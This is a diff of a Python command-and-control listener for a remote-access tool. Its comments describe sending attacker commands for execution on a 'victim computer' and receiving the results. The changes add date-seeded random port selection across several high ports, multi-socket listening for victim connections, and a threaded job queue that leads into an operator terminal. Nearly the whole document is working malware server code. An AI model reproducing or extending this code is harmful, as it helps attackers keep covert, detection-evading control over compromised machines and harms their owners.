@@ -5,25 +5,34 @@
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
 
-# Built-in Modules
+# Standard Modules
 import base64
+import datetime
 import socket
 import threading
 import json
 import time
+import random
 from queue import Queue
 
 
 class Listener:
-    NUMBER_OF_THREADS = 2
-    JOB_NUMBER = [1, 2]
-    queue = Queue()
-    Ip = "127.0.0.1"
-    Port = 4444
+    NUMBER_OF_THREADS = 6
+    JOB_NUMBER = [0, 9]
+    IP = "127.0.0.1"
+    NUMBER_OF_PORTS = 5
+    MAX_PORT_VALUE = 65535
+    MIN_PORT_VALUE = 49152
+
+    port_list = []
+    socket_list = []
     target = None
     target_ip = ""
     connection_list = []
     address_list = []
+    is_date_changed = False
+
+    queue = Queue()
 
     # Create and listen a tcp server socket with given ip and port values.
     def __init__(self):
@@ -46,9 +55,13 @@ class Listener:
         while True:
             x = self.queue.get()
 
-            if x == 1:
+            if x == 0:
+                self.randomize_ports()
+            elif x == 1:
+                self.create_socket()
+            elif x == 2:
                 self.listen()
-            if x == 2:
+            elif x == 9:
                 self.terminal()
 
             self.queue.task_done()
@@ -60,41 +73,56 @@ class Listener:
 
     # ****************** THREAD POOL ******************************************************************
 
-    def create_socket(self, ip, port):
+    def randomize_ports(self):
 
-        listener = None
+        date_time = datetime.datetime.now()
+        current_day = date_time.day
+        step = (self.MAX_PORT_VALUE - self.MIN_PORT_VALUE) / self.NUMBER_OF_PORTS
+        random.seed(current_day)
+        seed = random.random()
 
-        try:
-            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except Exception as msg:
-            print("Socket Creation Error "+str(msg))
-        try:
-            listener.bind((ip, port))
-            listener.listen(5)
-        except Exception as msg:
-            print("Binding Error: "+str(msg))
-        return listener
+        for i in range(5):
+            self.port_list.append(round(self.MIN_PORT_VALUE + step * i + step * seed))
+
+        self.queue.put(1)
+
+    def create_socket(self):
+
+        new_socket = None
+
+        for port in self.port_list:
+
+            try:
+                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            except Exception as msg:
+                print("Socket Creation Error " + str(msg))
+            try:
+                new_socket.bind((self.IP, port))
+                new_socket.listen(5)
+                self.socket_list.append(new_socket)
+                print("[+] Ready to accept connections from port {}".format(port))
+            except Exception as msg:
+                print("Binding Error: " + str(msg))
+
+            self.queue.put(2)
 
     def listen(self):
 
-        listener = self.create_socket(self.Ip, self.Port)
-        print("[+] Waiting for incoming connections")
-
         while True:
-
             try:
-                if listener is not None:
-                    # Wait for first connection. This is a blocking code
-                    response = listener.accept()
-                    # This prevents connection from timeout
-                    listener.setblocking(True)
-                    self.connection_list.append(response[0])
-                    self.address_list.append(response[1])
-                    print("[+] Got a connection" + str(response[1]))
-                else:
-                    break
+                for i, socket_element in enumerate(self.socket_list):
+                    if self.socket_list is not None:
+                        # Wait for first connection. This is a blocking code
+                        response = self.socket_list[i].accept()
+                        # This prevents connection from timeout
+                        self.socket_list[i].setblocking(True)
+                        self.connection_list.append(response[0])
+                        self.address_list.append(response[1])
+                        print("[+] Got a connection" + str(response[1]))
+                    else:
+                        break
             except Exception as msg:
-                print("Listener Error "+str(msg))
+                print("Listener Error " + str(msg))
                 time.sleep(1)
 
     # List all available connections
@@ -205,7 +233,6 @@ class Listener:
     # Here we are sending commands to be executed on victim machine which their result
     # will be sent back to us
     def connect_to_the_target(self):
-
 
         while True:
 
